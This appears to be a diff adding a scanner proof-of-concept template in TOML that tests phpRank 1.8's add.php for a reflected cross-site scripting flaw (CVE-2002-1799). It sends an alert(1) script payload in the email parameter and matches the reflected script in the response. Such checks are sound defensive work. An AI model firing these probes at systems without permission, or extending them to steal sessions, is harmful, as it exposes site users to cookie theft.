@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 phpRank 1.8 add.php 页面的跨站脚本攻击（XSS）漏洞。远程攻击者可通过向 email 参数或 banurl 参数注入恶意 JavaScript 代码，当其他用户访问包含恶意脚本的页面时，脚本将在受害者浏览器中执行，导致会话劫持、Cookie 信息窃取或页面内容篡改等后果。该漏洞影响所有部署 phpRank 1.8 版本的站点，攻击者无需账户凭证即可发起攻击。"
+id = "POC-AVE-2002-0679"
+name = "phpRank 1.8 add.php XSS PoC"
+severity = "medium"
+tags = ["ave-2002-0679"]
+vuln_id = [
+    "CVE-2002-1799",
+    "AVE-2002-0679",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/add.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "email=<script>alert(1)</script>&banurl=http://example.com"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
